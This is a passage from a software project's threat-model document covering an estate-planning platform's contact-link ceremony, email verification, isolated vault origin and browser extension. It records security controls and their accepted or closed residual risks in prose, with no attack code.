  list projection under M12's audited-decrypt-volume rule, and that paragraph
  was the requirement rather than an observation. **Discharged for contacts by
  PR2**: the contact list now spends one audited decrypt per row and the values
  have no field on the wire at all.
- **[ACCEPTED]** *Deliberately NOT discharged for family.* The family list
  still decrypts every field it stores, and that is a scope-down with a reason
  rather than an oversight: the household panel RENDERS name, date of birth,
  minority and notes, so there is nothing to narrow — four of five contact
  fields were unused by a list, and zero of four family fields are. The volume
  differs by an order of magnitude too (a household is a handful of rows; an
  address book is not). If a future surface lists family members without
  showing them, it inherits the PR2 requirement above.

## 6g. Threat-model delta — M13 the contact link ceremony (2026-08-06)

`contacts.linked_user_id` had no write path anywhere in the platform until this
change. That is why §6b could credit the linked-contact gate for intake being
unable to enumerate while nobody could actually become a linked contact: the
control was real and the capability behind it was unreachable. M13 PR3 makes it
reachable, which activates every consequence §6b described.

**What a link confers, stated in one place.** Being the linked user of a
contact means: eligibility to open a settlement case against that owner (§5.1
control 1's reporter test), resolvability as their executor when a case is
verified (§5.1 control 5), and effectiveness of any `permission_grant` attached
to a role assignment naming that contact (§5.5). None of those is granted by the
link alone — each needs its own separate step — but none of them is reachable
without it.

**The ceremony.** Owner mints a 160-bit single-use code under step-up; the
server stores only its sha256; the owner is shown it ONCE and delivers it out of
band; the contact redeems it while authenticated on their own existing account.
Three properties are load-bearing:

- *No address is handled anywhere.* M9's shipped doctrine gives the notification
  wire no content field and forbids links, so an emailed invitation would have
  contradicted a decision made one milestone earlier. It also means this flow
  adds no second home for a contact's email address.
- *The code is the ONLY selector on redemption.* The route takes no owner id and
  no contact id — there is no parameter in which to name an account, so
  redemption cannot become an oracle for whether one exists. This is the same
  property §6b credits intake with, preserved rather than re-argued.
- *The redeemer must already have an account.* Not an invite-to-register flow,
  and it cannot be used to create one.

**Uniform refusal.** Unknown, expired, spent, revoked, self-directed and
raced-away codes all answer `invalid_code`, byte-identical. Distinguishing them
would tell whoever holds a guess that the guess named something real. Accepted
cost: a legitimate user gets a vaguer message, paid down by letting the owner
re-issue freely (which retires the previous code and audits the retirement).

**Gate asymmetry, in both directions.** Minting is step-up gated — it hands out a
capability on the §5.1 chain, so it sits with naming a fiduciary. Withdrawing an
unused code and removing a live link are `CallerGuard` only, on the M6 rule that
the protective action must never be harder than the permissive one. Redemption is
`CallerGuard` only because the authority is the code.

**FLAGGED DEVIATION: redemption takes no Cedar decision.** Every other route in
this service passes a PEP first. Redemption cannot: the redeemer has no
relationship to the estate until it succeeds, so every attribute a policy could
match on is precisely what the code stands in for, and a decision there would
read `deny` until the moment it read `allow` for reasons the policy could not
see. The authority is a bearer capability. Recorded here rather than disguised.

**Notifications are a PRECONDITION in production, and the send's OUTCOME is
recorded.** Redemption refuses (503 `notifications_unavailable`, separately
audited) behind an adapter that reaches nobody — the M6/M7/M9 rule. Behind a real
adapter the send is best-effort by design (a notification failure must never roll
back the state change it describes), but never silent: the claim's audit event
carries `ownerNotified: delivered|failed`, the vault delivered_at-NULL precedent,
so a non-delivery is a recorded fact rather than an absence. The notify also runs
BEFORE the audit emit, because the emit propagates broker failures by design and
must not be able to cancel the notification — the code is spent by then and no
retry would ever re-send it. The reason is specific: a claim the owner never
hears about is how a code that went to the wrong person becomes an invisible
authorization edge, and the owner's out-of-band channel is this ceremony's trust
anchor, so their after-the-fact visibility is what makes the anchor auditable.
Profile therefore becomes the third holder of the notifications SEND credential —
and deliberately not of the RECIPIENTS credential, so it can never repoint where
anyone's alerts go (the M9 review's split, applied to a new holder).

**Atomicity is a control, not hygiene.** Spending the invitation and writing the
link happen in one transaction with each statement restating its own
preconditions. A spend with no link would lock that contact out of ever being
linked; a link from an invitation still live would be replayable. Two concurrent
redemptions of one code therefore produce exactly one link and the loser rolls
back — the CAS shape §6b's owner-liveness interlock uses, for the same reason.

**ACCEPTED RESIDUALS, stated rather than implied.**

- **[ACCEPTED]** *The owner's channel is the trust anchor.* An owner who sends the code to the
  wrong person links the wrong person. Detected rather than prevented: audited on
  both sides with the redeemer as actor, notified to the owner, visible in their
  contact list, and removable in one click. Identical in kind to M6's
  grantee-fingerprint confirmation.
- **[OWNER: E1]** *The attempt cap bounds an online attack on a REAL code only.* An unknown code
  leaves no row to count against, by construction. 160 bits is what makes
  guessing infeasible; the counter is what an alert would watch. General
  per-caller rate limiting on the redeem route is edge work (§4 TB1 — i.e. the
  WAF, and therefore **E1**, the AWS half; the owner is named here rather than
  left one hop away, because a pointer to a category is how a deferral goes
  uncosted) and is
  UNCHANGED by M17 PR1, whose two bounds key on an account and on a submitted
  address — a redeem request carries neither, which is the same "nothing to
  attribute a count to" that makes the row-keyed cap weak here (§6k).
- **[ACCEPTED]** *A code lives in the owner's session response and wherever they put it next.*
  It is not stored recoverably server-side, but it is a secret in a browser for
  as long as that page is open, and in whatever channel the owner chooses. That
  is inherent to an out-of-band ceremony.
- **[ACCEPTED]** *Unlinking does not revoke what the link already enabled.* A settlement case
  the linked contact opened before being unlinked stays open — cases are evidence
  and have no soft delete (§5.1 c6). **ACCEPTED BY M40 PR3** (§6ggg): three
  decisions already argued out in source meet here, and none of them is owed
  work. Cases are evidence by DDL; unlink stays ONE CLICK because the protective
  action may never be harder than the permissive one; and the owner holds a kill
  switch with a real consumer. M22 is `**COMPLETE.**` and will never revisit it,
  so the tag was the stale-owner defect rather than a plan. **WHAT SURVIVES THE
  UNLINK, NAMED**: the reporter's `read` on the already-open case and document
  `evidence_add` against it, because `caseResource` snapshots `reported_by`
  while the executor path re-derives linkage per query — two different lifetimes
  for one relationship, which is the actual shape and was not in the old
  sentence. **THAT LIST WAS HALF OF IT, AND M40 PR4 FOUND THE REST — see §6hhh.**
  There is a SECOND snapshot gate this bullet did not know about:
  `assertCaseVisible` (`admin.service.ts`) takes no Cedar decision at all, admits
  on the bare `kase.reported_by === actor`, and carries FIVE more reads —
  `timeline`, `listStages`, `listTasks`, `listDistributions` and
  `distributionAmount`, the last of which decrypts the estate's distribution
  amount under the DECEDENT's DEK and returns it as plaintext. Seven survivors,
  not two, behind two gates rather than one. **AND THAT WAS STILL AN UNDERCOUNT —
  M48 FOUND A THIRD GATE AND AN EIGHTH.** `CasesRepo.listForUser` is
  `WHERE decedent_user_id = $1 OR reported_by = $1`, reached by `listMyCases`: a
  third frozen-`reported_by` admission, in raw SQL rather than in Cedar or in a
  bare `===`, on a route neither this bullet nor §6hhh mentioned. The review that
  found the second gate stopped one short of the third, which is the shape §6ggg
  records happening to a count rather than to an owner. It is also the gate M48
  deliberately KEEPS: see the disposition below. Worse for the argument above: all
  five sit POST-verification, which is precisely the window this bullet's own
  last sentence says the owner's void does not reach, so the acceptance's third
  leg never covered them. And the asymmetry is three lines wide — the executor
  arm of that same `if` calls `isExecutorOf` LIVE while the reporter arm reads a
  frozen column.
  **SPLIT BY M40 PR4**: this bullet keeps the READS, which stay `[ACCEPTED]` —
  a reporter who filed a case seeing that case is the evidence trail §5.1 c6
  makes by DDL, and revoking it would mean a case with no visible author. The
  MONEY and the missing trail are a different claim and are owned separately in
  the bullet below.
- **[CLOSED: §6iii]** *An unlinked reporter could decrypt the estate's
  distribution amounts, and four case reads left no trail.* Split from the
  bullet above by **M40 PR4** (§6hhh), which is where the evidence is. Two
  claims, one owner, closed by two PRs. (1) `distributionAmount` funnels through
  `assertCaseVisible`, so a removed contact who once filed a report reached an
  audited decrypt of the estate's distribution amounts under the DECEDENT's DEK
  and received the money as plaintext. Seeing that a case exists is the evidence
  trail; reading what the estate pays out is not, and no leg of the acceptance
  above reached it — the owner's void is pre-verification only and a
  distribution exists only after. **M48 PR1 (`de91ae3`) closed this** by
  conjoining a live `isLinkedContact` onto the reporter arm of the gate, which
  takes all five reads from an unlinked reporter rather than only the money one.
  (2) `recordOperatorRead` early-returned `if (!isOperator)`, so four reads
  behind the gate emitted nothing at all; only the money route was audited,
  which is the one place the trail existed and the four cheaper reads are where
  a pattern would show. **THE SUBJECT OF (2) IS NOT THE SUBJECT OF (1), AND THIS
  SENTENCE SAID OTHERWISE UNTIL M48 PR2.** It read "so THIS CALLER's ... reads
  emit nothing", inheriting clause (1)'s removed contact — who, after PR1,
  reaches none of these routes. The parties the silence actually covered are the
  DECEDENT, a STILL-LINKED REPORTER and the EXECUTOR, and the executor is the
  one that mattered: they administer somebody else's estate, and the assets
  service has always audited that same read as `asset.estate.viewed`.
  **M48 PR2 closed this** — the early return is gone, `actorType` is derived
  from the gate at every emitter, the fifth gated read joined the case trail,
  and `listMyCases` (the third gate, kept frozen by PR1) is audited as a
  worklist. THE SHAPE WAS THREE LINES WIDE: the same `if` re-derived the
  executor's linkage live via `isExecutorOf` and read the reporter's off a
  frozen `reported_by` column, so the platform already knew how to do this for
  one party. **AND THE STOP IS NARROWER THAN THE OLD SENTENCE CLAIMED**: the
  owner's step-up-gated void is PRE-VERIFICATION only. After verification there
  is no self-serve rescue, and the remedy is the §5.1 human-review path.

## 6h. Threat-model delta — M14 address ownership (2026-08-07)

**What was wrong.** Three shipped fail-closed controls — §5.2 emergency access,
§5.1 settlement intake and review-approve, and §6g's link ceremony — refuse in
production rather than proceed silently, on the rule that a waiting period
nobody can be told about is not a control. All three tested
`deliversToRealChannels`, which is A PROPERTY OF THE ADAPTER, NOT OF THE
RECIPIENT: a hardcoded literal on whichever adapter class that service's own
`NOTIFY_MODE` selected, declared independently three times, `false` on the stub
and `true` on the HTTP one. It asks whether SES is wired. It never asks whether
the stored address belongs to the owner, and could not — the bit never left the
process and never named a recipient. So the gate was satisfied, the escrow
armed or the five-day clock started, and the owner's ability to INTERRUPT — the
entire content of §5.2 and of §5.1's control 3 — was unenforced.

The sharp part was an anti-correlation: the only self-heal was identity's
login-time re-feed, so the stored address was freshest for active users and
STALEST for the dormant owner a fraudulent death report actually targets — and
once status reaches `settlement`, login is blocked, so it could never heal.

**The ceremony.** Identity mints a 160-bit code at FIRST AUTHENTICATED LOGIN
(never at registration — an unauthenticated route would be a mail-bomb and
sender-reputation primitive; **M17 PR1 falsified the second half of this
parenthesis, and the decision stands on the first half alone** — register now
carries an address-keyed bound (§6k), but it is per-process and best-effort,
which is not something to hang a mail-bomb defence on, and firing a notification
kind at an unauthenticated route would still be reachable by anyone holding a
victim's address), stores only
its sha256, mails it through notifications' own credential-scoped route, and
marks the address verified when the user returns it. One uniform `invalid_code`
for unknown, expired, spent, revoked, attempt-exhausted, someone-else's and
raced; free re-issue behind a five-minute floor.

**The verified bit lives on `notification_recipients`**, not on `users`, so the
delivery store structurally cannot hold an unproven address without saying so.
`users.email_verified_at` stays dead rather than becoming a second source of
truth.

**Gate classification.** A verified address gates CAPABILITY-ARMING actions, not
case-opening ones:

| requires verified (refuses) | proceeds and records |
|---|---|
| vault escrow `configure` | vault `request`, vault `release` |
| vault `rearm` | profile link redemption |
| profile link-code `invite` | settlement `report`, provider signal, review-approve |

The discriminator is that in the right-hand column the ACTOR and the
NOTIFICATION RECIPIENT are different people. Refusing there on the OWNER's
unverified address would let an owner's own typo permanently deny a legitimate
grantee, redeemer or reporter — the M6 rule that the protective action must
never be harder, pointed the other way — and applied to §5.1 intake it becomes a
denial of service against exactly the dormant, never-verified owner a fraudulent
report targets. Those paths record `sent_unverified` in the send log and an
`unverified_recipient` audit event instead.

**One approved deviation from M9's content doctrine.** The platform now mails a
variable that is not a date. It is a typed `code`, never a `text` field:
platform-authored (`randomBytes`), opaque, single-use, short-lived. The subject
is unchanged and there is still NO LINK, so "we never link you" stays literally
true. It travels on its own route behind its own credential, and `SendSchema` is
built from a kind list that EXCLUDES it, so a send-credential holder — vault,
settlement, profile — cannot fire it.

### Residuals

- **[CLOSED: §6n]** *A user who mistypes their address at registration cannot fix it.* There is no
  address-change route anywhere in the platform, and verification can only ever
  target the address already on file. In production such a user is permanently
  refused escrow `configure`, `rearm` and link-code `invite`, with no
  self-service and no operator remedy (that belongs to the TB7 operator
  platform). The arming gates' justification — "refusing costs them an action
  they can unblock themselves" — is true for the intended contrast (actor ==
  recipient) and FALSE as an unconditional claim; it is recorded here rather than
  softened. It fails in the safe direction. **CLOSED by M17 PR4 (§6n)**: the
  change ceremony proves the NEW address before anything on file moves, so a
  mistyped registration address is now recoverable by changing to a correct
  one — and the written obligation this paragraph carried (clear the verified
  bit, invalidate outstanding codes) was discharged one step stronger than it
  asked: no unproven address ever reaches the delivery store, so the bit is
  stamped by replacement rather than cleared, and outstanding codes die in the
  same transaction as the switch.
- **[ACCEPTED]** *A SEND-credential holder can read any user's verified bit* by firing one
  notification at them, because the send response carries `recipientVerified` —
  deliberately, so settlement can record the fact without holding the STATUS
  credential. What the STATUS edge still withholds is the SILENT read: a send
  costs the subject a real estate alarm, a committed send-log row and an audit
  event. A weaker oracle, not none. The M14 security review found the credential
  graph claiming the send edge exposed no delivery state at all; that sentence
  is corrected rather than the field removed.
- **[ACCEPTED]** *An unreachable status route refuses every arming action.* The gates fail
  closed on an unanswerable query, so a notifications outage suspends escrow
  configuration, re-arming and link-code minting entirely. That is the intended
  direction — blocking delays a legitimate owner by minutes where the other
  direction hands an attacker a whole waiting period — but it is a total outage
  of those paths, not a degradation, and it is the first network round trip
  those gates have ever made.
- **[OWNER: E1]** *An authenticated attacker can sustain one mail per five minutes to an
  address they typed into their own registration.* The re-issue floor is
  per-account, with no per-address, per-IP or global cap, so a single arbitrary
  address can be sent roughly 288 content-free "confirm this address" messages a
  day. UNCHANGED by M17 PR1: that change bounds login and register, and this is
  an AUTHENTICATED route whose only limit remains its own five-minute re-issue
  floor. "Rate limiting is absent platform-wide" was true when written and is
  now narrower — the platform has three bounds (step-up, login, register) and
  this route is behind none of them.
- **[OWNER: M29]** *Registration's fixed-shape, fixed-time response is still owed.* M14 closed
  the address-ownership half of §5.3's enumeration residual and did NOT close
  the timing half: `register` still awaits KMS, inserts and Kafka publishes on
  the new-email path only. Recorded in `auth.service.ts` and unchanged here.
## 6i. Threat-model delta — M15 the vault surface (2026-08-08)

M6 activated **TB6 (client device)** in the library. M15 activates it in the
BROWSER, which is where risk #4 (vault client-side compromise, Critical) has
always actually lived: until now no page in this product ever held a Zone A key,
so every TB6 control in §4 was a requirement with no surface to apply to. §6a
recorded that plainly — "the isolated vault origin, CSP, and Trusted Types are
frontend controls; no vault UI ships in M6, so they land with that surface."
This is that surface. PR1 deliberately ships the boundary with NO vault crypto
behind it yet.

**The §4 TB6 controls, now shipped and their status.**
- *Isolated vault origin:* shipped. A different HOST (`vault.localhost:3010`
  locally, `vault.<domain>` in production), not a different port — MEASURED,
  because cookie scope ignores the port and a port-only split would have sent
  the app's session to the vault on every request. The vault's cookie carries
  the `__Host-` prefix, so host-only is enforced by the browser rather than by
  convention, which is what makes a same-registrable-domain deployment safe.
- *Strict CSP:* shipped, and stricter than the main app's honest-partial one.
  `default-src 'none'`, `script-src 'self'` with NO `unsafe-inline` and NO
  `unsafe-eval` in ANY environment, `connect-src 'self'`, `img-src 'self'` (no
  `data:`), `frame-ancestors 'none'`, `base-uri 'none'`.
- *Trusted Types:* shipped and ENFORCED — `require-trusted-types-for 'script'`
  with `trusted-types 'none'`, so no policy may be created and every DOM XSS
  sink throws. This is only possible because the client is framework-free; a
  framework that templates through `innerHTML` needs a permissive policy, which
  is the control in name only. Verified in a real browser: policy creation
  refused, `innerHTML` threw with zero nodes created, `eval`/`new Function` threw
  EvalError from page context.
- *No third-party scripts on vault surfaces:* shipped, and stronger than an
  allowlist — there is no bundler and no dependency tree. The browser client
  imports only relative paths and (from PR2) `@estate/vault-crypto` by absolute
  path from this origin. Enforced by a source fence.
- *Re-auth on vault open:* shipped. Minting the handoff requires a fresh step-up,
  and the vault service's own SRP legs are step-up gated (M6).
- *WebCrypto non-extractable keys, memory zeroization, clipboard auto-clear:*
  SHIPPED IN PR2. The master key is unwrapped as a non-extractable `CryptoKey`,
  so an injected script on this origin could use it but not read it out. Byte
  arrays are wiped where they exist; the `CryptoKey` itself has no bytes this
  client can zero, and that limit is stated in the code rather than left to be
  read as a stronger promise. Clipboard auto-clear is 20 seconds and is
  described to the user as best effort, because a page cannot read the clipboard
  to check, cannot reach a clipboard manager or a synced clipboard, and never
  clears at all if the tab is closed first.
- *Re-auth on vault open, in full:* the handoff needs a fresh step-up, and the
  vault's own SRP legs are step-up gated. PR2 adds a client-side idle lock at 5
  minutes and a `pagehide` lock, so a bfcache restore returns locked rather than
  with keys in memory.

**New in the threat model: the handoff itself.** Authority now crosses an origin
boundary, which is a channel that did not previously exist. It is a single-use
160-bit code, minted under step-up, delivered by a top-level form POST (never a
URL, a fragment, or a `Referer`), burned on the ATTEMPT, and redeemed
server-side for a session that is `vault`-audience, 15 minutes, and carries NO
refresh token. Deny-by-default audience enforcement means that session opens the
vault service and nothing else — measured across every service. A vault session
cannot mint another handoff, so a leak cannot chain forward.

**Residuals accepted, and why.**
- **[ACCEPTED]** *The handoff is a bearer capability for 60 seconds.* Anyone holding it can
  redeem it, because the redeem route takes no other selector — which is
  deliberate, since a route that could name an account would be an enumeration
  oracle (§6g's rule). Bounded by the window, single use, TLS in production, and
  by the fact that redemption yields a session that decrypts nothing.
- **[ACCEPTED]** *The vault origin sees contact NAMES* (from PR3's grantee picker, projected at
  the edge to `{contactId, linkedUserId, name}` and filtered to linked contacts).
  Unavoidable rather than accepted lightly: an owner confirming a key
  fingerprint out of band must know whose key it is. No other Zone B field can
  cross.
- **[OWNER: E1]** *A subdomain shares a registrable domain with the app.* `__Host-` makes the
  cookie host-only at the browser, so the practical exposure is a cookie set
  with an explicit `Domain=` on the parent — which nothing in this repo does. A
  separate registrable domain closes it entirely and is a deployment choice.
- **[ACCEPTED]** *`script-src 'self'` trusts this origin's own served files.* A CSP is a
  browser-side control and cannot defend against a compromised BUILD; the
  supply-chain half is the empty dependency tree and the absence of a bundler,
  not this header.
- **[OWNER: E1]** *No rate limiting on handoff minting.* The cross-reference is corrected rather
  than the residual closed: identity's login bound shipped in M17 PR1 (§6k) and
  does not reach this route, which is authenticated and step-up gated — so the
  M16 attempt cap already stands in front of it, and what remains unbounded is a
  caller who holds a genuine step-up. Interim bound: one unspent handoff per
  user, enforced by a partial unique index, so pressing the button repeatedly
  leaves one live credential rather than many.

**The Secret Key on the device, as a residual rather than a control.** PR2
persists it in IndexedDB by default, with an explicit opt-out. Under XSS on this
origin it is readable — localStorage and IndexedDB alike, since no browser
primitive hides bytes from same-origin script — so the mitigation is the empty
dependency tree, `script-src 'self'` and enforced Trusted Types, not the storage
API. The default is deliberate: requiring 26 retyped characters at every unlock
reliably moves the key to a text file on the desktop, which is worse. The vault
PASSWORD is never persisted, so a stolen Secret Key alone opens nothing.

**PR3 — emergency access reaches a user, and §5.2's ceremony becomes real.**

*The out-of-band fingerprint confirmation is now a shipped control rather than a
design.* Until PR3 the 16-symbol fingerprint the M6 review widened had no client
at all, so key substitution by a malicious server — which `grantee_public_key_
sha256` cannot detect, because that digest is derived from whatever key the
client was handed — was mitigated only on paper. The screen shows the
fingerprint, tells the owner to check it by phone or in person and NOT through
this platform, and refuses to arm until at least one candidate is confirmed.

*A design that could not complete.* M6's `wrapped_private_key` was written and
never served, so a grantee could not open a share sealed to them and no release
could ever finish. Closed by an own-key route gated on an OPEN VAULT, which also
states the property that makes emergency access safe to expose: a stolen bearer
reaches the release route and comes away with ciphertext it cannot open, because
the private half lives inside the grantee's own vault.

*A NEW disclosure, bounded and declared.* Contact names now cross onto the vault
origin. The read is a dedicated profile route whose entire response is a contact
id, an account id and a name, it is the ONLY route in that service a
`vault`-audience session may reach, and both facts are declared as data in
`AUDIENCE_ROUTE_ADMITTERS` and checked against source in both directions. What a
leaked vault handoff buys at profile is therefore exactly that projection for the
owner's own linked contacts — measured against the live service, not argued: the
same token is refused 401 at `/v1/contacts`, `/v1/contacts/:id`, `/v1/profile`,
`/v1/profile/family` and `/v1/role-assignments`. The alternative considered and
REJECTED was a service-wide widening, which would have handed that token the
owner's PII, every contact's decrypted detail, the family tree and the roles.

*Residual, unchanged from M6 and restated because a UI does not fix it:* a server
that releases its platform half early defeats the waiting period. The
compensating controls are the audit trail and owner notification, both of which
this surface now exercises — a request, a refusal and a denial each produce an
ids-and-enums audit event, and the owner's screen offers denial as one ungated
tap.

*Residual, new:* the grantee picker's names come from the candidate list, so a
contact deleted after an arrangement was made shows as an account id. The row
still renders and can still be removed — hiding a live arrangement would be the
worse failure — but the owner sees an opaque id rather than a person.

**PR4 — the security review, and the boundary it found crossed.**

*The isolation held for confidentiality and not for destruction.* Reaching the
vault API was never opening a vault — that needs the vault password and the
Secret Key, neither of which this platform holds. But `POST /v1/vault/reset` is
gated on step-up ALONE, deliberately, because a lost vault password cannot be
proven; and handoff redemption granted step-up. So a stolen 60-second code
crypto-shredded every item, the emergency escrow and the recovery keypair. The
escalation is the sharp part: app-origin script cannot MINT a handoff (minting is
step-up gated) but can read one out of the hidden field it is posted in, so
stealing a code converted no-step-up into step-up authority over Zone A — and
the app origin is the weaker one, since its `script-src` is not locked down
(M11). CLOSED: redemption grants no step-up, and the vault origin proves its own
factor through `POST /v1/auth/stepup`, the route widened in PR1 for exactly this.

*The fingerprint ceremony had one side.* The owner reads a code out; the grantee
had nowhere to read theirs, so the only defence against a malicious server
substituting its own key for a grantee's could not be exercised.
`grantee_public_key_sha256` cannot substitute for it — it is derived client-side
from whatever key the client was handed. CLOSED: the grantee's own fingerprint is
displayed, computed from the key the server serves back.

*Residual, CLOSED by M27 PR3b (§6zz):* a released escrow reconstructs the
owner's recovery key and this client NOW READS the owner's items with it —
`renderGrantedItems` behind `GET /v1/vault/emergency-access/:policyId/items`.
The sentence said "cannot yet", and went on saying it after the capability
shipped in the very `app.ts` it cites; M27 PR5 corrected it. A residual that
claims a capability is missing is what stops the next reader looking for it. This bullet used to continue
"release is one-shot, so pressing the button spends the arrangement", which was
the sharp half — the grantee traded the whole arrangement for a reconstruction
they could not use. Since §6yy collection repeats, so the cost of pressing it is
a wasted attempt rather than a destroyed escrow, and `app.ts` says so where it
used to say the arrangement was spent. The warning is still given BEFORE the
action; the reader is PR3b, with its own retention decision, because holding a
second owner's master key in memory is not something to settle inside a fix
round.

*Residual, accepted:* an M-of-N escrow above threshold 1 is refused by this
client at both layers. The protocol and the service support it; collecting
several grantees' shares does not exist, and arming an arrangement nobody can
open would be worse than declining to arm it.

## 6j. Threat-model delta — M16 the vault browser extension (2026-08-10)

M16 opens **TB9** (§3, §4): the extension against arbitrary web pages. This
section is written as PR1 begins and is updated by each PR as its controls land,
rather than assembled after the review — the M14 rule that a milestone which
invalidates a sentence owns that sentence.

**Why this is not TB6 with a new client.** TB6's controls are the isolated
origin, its CSP, enforced Trusted Types and an empty dependency tree. None of
them reaches a page we do not serve. An extension is code of ours running beside
code of theirs, on their origin, with read and write access to their DOM — a
channel with no counterpart anywhere else in the platform.

**Decisions and their residuals.** The full list is in docs/04 M16 and the
CLAUDE.md decision log; the security-relevant shape is:

- *Keys* live as non-extractable `CryptoKey`s in an offscreen document, the only
  extension context that loads `@estate/vault-crypto`. Persisting a `CryptoKey`
  in extension IndexedDB — possible, and the option the brief's premise hid — is
  REFUSED, because it yields a vault permanently open with no password, no
  Secret Key and no TOTP, defeating 2SKD and §5 of docs/01. *Residual:* while
  unlocked, code in that context decrypts everything; non-extractability stops
  exfiltration, not use.
- *The extension is server-anchored.* It caches item ciphertext and nothing that
  enables an offline unlock, so the offline brute-force target M15 kept off the
  disk stays off it. *Residual:* no unlock without connectivity.
- *Origin matching* is the boundary's defining control; see §4 TB9.
- *The credential* is a refresh-capable `extension`-audience session, admitted
  PER HANDLER to SEVEN vault routes (`keysetStatus`, both SRP legs, `listItems`,
  `createItem`, `updateItem`,
  `lock`) and THREE identity ones (`session`, `stepUp`, `logout`). What a stolen
  copy buys, end to end: the ability to attempt an SRP handshake, which
  additionally requires a fresh step-up, the vault password and the Secret Key —
  and no item, because every item route — read OR write — is behind
  `VaultSessionGuard`. SIXTEEN vault routes refuse it, including `reset`, both
  keyset routes, `deleteItem` and every emergency-access route; so does
  `mintHandoff`, so a leaked extension session cannot chain itself into a vault
  one. (It was eighteen until M16 PR4a admitted the two writes; the count is
  derived from the controllers by `session-audience.spec.ts`, so it cannot drift
  from the code — only from this sentence, which is why the sentence is edited
  with it.)
  *Stale by construction, and deliberately not edited:*
  `apps/services/identity/migrations/006_extension_audience.sql` still says
  "five vault routes". The migrator checksums applied files and raises
  `MigrationDriftError` on a mismatch, so correcting it would break every
  deployment that has already run it. A migration is a record of what was true
  when it ran; the live count lives here and in the spec that derives it.
  `POST /v1/auth/refresh` is deliberately absent from that count and is not an
  omission: it carries no guard at all, being unauthenticated by construction,
  so there is no audience decision to declare there. What keeps it safe is a
  different property — refresh ROTATES IN PLACE, updating the same session row,
  so a refreshed session cannot change what it is for. That was true by accident
  of an UPDATE's SET list until M16 pinned it with a test.

**What M16 closes that predates it.**

- **[OWNER: M39]** *§6a's rate-limiting residual, in part.* Step-up now carries an attempt cap
  derived from the append-only `auth_events` ledger, which bounds the vault's SRP
  legs TRANSITIVELY because both are step-up gated. The half that remains open is
  a caller with a genuine step-up burning handshakes. RE-OWNED FROM M27 BY M27 PR0;
  this is §6a's bullet, not a second residual.
- *No user-reachable session revocation.* Before M16, `revokeAllForUser` had one
  caller behind a service credential, and identity exposed no session listing, no
  revoke-by-id and no password-change or password-reset route — so the only way
  to revoke a session was to present it. (M17 PR2 closed the password-CHANGE
  half of that sentence and PR3 closed the RESET half, so identity now exposes
  all three. It also gives the sentence a second
  meaning: a password change now revokes every OTHER session in the same
  transaction, so the ordinary remedy for "something has my credentials" is one
  action rather than a per-row sweep.) Tolerable while every session was one
  cookie-bound browser; not tolerable beside a long-lived credential on a device.
  PR1 ships the first paired-devices list with per-row revoke, ON A SURFACE and
  in the same PR as the routes: an owner can see every live credential on their
  account and end any of them. Revocation is deliberately UNGATED — the M6 rule
  that the protective action must never be harder than the permissive one, with
  minting the pairing code as the gated half — while the row for the caller's
  OWN session goes through logout instead, because only logout also expires the
  cookies carrying it, and a browser that still looks signed in over a dead
  session is the M8 logout entry's worst outcome. What a row can SAY is bounded
  by what identity returns: an audience and two timestamps, no IP and no device
  name, since those columns exist and nothing writes them. So a row identifies a
  credential by what it can REACH rather than by where it is — which is also the
  one place a user reads the boundary this milestone exists to create.
- *A fence that was documented and never written.* `004_session_audience_and_
  handoffs.sql` claimed a spec pinned its `CHECK` to `SESSION_AUDIENCES`; none
  existed. PR1 writes it, mutation-tested.

**Residuals carried, not closed.**

- **[CLOSED: §6xx]** *An unlocked extension can overwrite every item, and the restore surface
  it is recoverable BY has no screen yet.* `deleteItem` stays refused, so the
  destructive verb is out, and `vault_items_versions` captures BEFORE UPDATE OR
  DELETE. **M27 PR1b MOVED THE FIRST HALF OF THIS AND NOT THE SECOND**, and the
  bullet stays open on the difference. Production code now reads that table:
  `GET /v1/vault/items/:itemId/versions` and `POST
  /v1/vault/items/:itemId/restore` put a prior image back — the ciphertext and
  its blob version together, which is what makes it open — so "recoverable" is
  true of the PRODUCT and not only of the data, and `session.ts`'s refusal rests
  on a capability that exists. What does not exist is a way for an owner to
  REACH it: the routes are live behind their own vault session, and the screen
  that calls them is M27 PR2. A capability with no surface is better than none
  and is not the same as done, so this is retagged when PR2 lands rather than
  now. Recovery today still means somebody driving the API by hand — a smaller
  gap than an operator with psql, and the same KIND of gap. MOVED HERE BY M27 PR0, from under
  `**Added by PR3a (origin matching).**` where it had no tag at all and assigned
  itself to "the operator platform (TB7)" — a milestone that shipped as M21 without
  it. The bullet was invisible to the residuals fence for the whole of that time:
  §6j organises by PR, and a lead-in that does not say "residual" was never
  classified, so the single most load-bearing sentence about the restore half sat
  outside the mechanism built to make deferrals visible. It is M27's headline scope,
  and it is the security argument `packages/auth-guard/src/session.ts` rests
  `deleteItem`'s refusal to the extension audience on — a refusal justified by a
  capability nobody had built. **CLOSED by M27 PR2 (§6xx)**: the owner's own
  History and Deleted-items screens on the isolated origin call all four
  routes, so recovery no longer means driving the API by hand. The bullet is
  kept rather than deleted — it is the only place the whole arc from M16's
  refusal to M27's screen is written down, and the sentence a later milestone
  would need to re-derive if it were gone.
- **[OWNER: M26]** *A paired-devices row cannot identify a device.* The
  headline residual it sits under — "no user-reachable session revocation" — is
  genuinely closed by PR1's list with per-row revoke, and by §6l and §6m for
  the change and reset halves. Its LAST sentences are not: `sessions.ip_ct` and
  `sessions.device_id` are declared in `001_auth_schema.sql` and the only
  mention of either identifier anywhere in identity's `src` is the comment in
  `sessions.repo.ts` explaining that nothing writes them, so `listLiveForUser`
  returns an audience and two timestamps. An owner with two browser sessions,
  or two paired extensions, sees rows they cannot tell apart, on the one screen
  whose purpose is to end the compromised one. Split out here because a
  remainder riding a closure is exactly what this sweep exists to surface, and
  the closure's own framing — "a row identifies a credential by what it can
  REACH rather than by where it is" — is what made it read as settled.
- **[ACCEPTED]** *A compromised store update is undetectable by the platform.* Reproducible
  builds and published provenance make it discoverable by a third party.
- **[ACCEPTED]** *Autofill does not resist phishing.*
- **[ACCEPTED]** *App-origin script can read a pairing code out of the DOM*, buying a paired
  extension that reaches ciphertext only and appears in the owner's device list.
  PR1's surface displays the code in a `<code>` text node, deliberately behind a
  step-up and shown once, which is the shape M13's link code already takes; what
  it does not do — and cannot, on an origin whose `script-src` M11 recorded as
  not locked down — is keep script on that origin from reading it. The device
  list is what makes the result VISIBLE rather than silent.
- **[OWNER: E1]** *An older audit consumer drops an action it does not know.* A rolling deploy
  where identity is ahead of the audit service loses those events: an
  unrecognised action is a `schema_violation` to the consumer, indistinguishable
  from malformed input. Observed as absence during PR1's live drive (the mint
  and pairing events emitted before the audit service was rebuilt never reached
  `audit_events`); the rejection itself was read from `ingestor.ts` rather than
  seen, because the container's logs did not survive its restart. Deploy order —
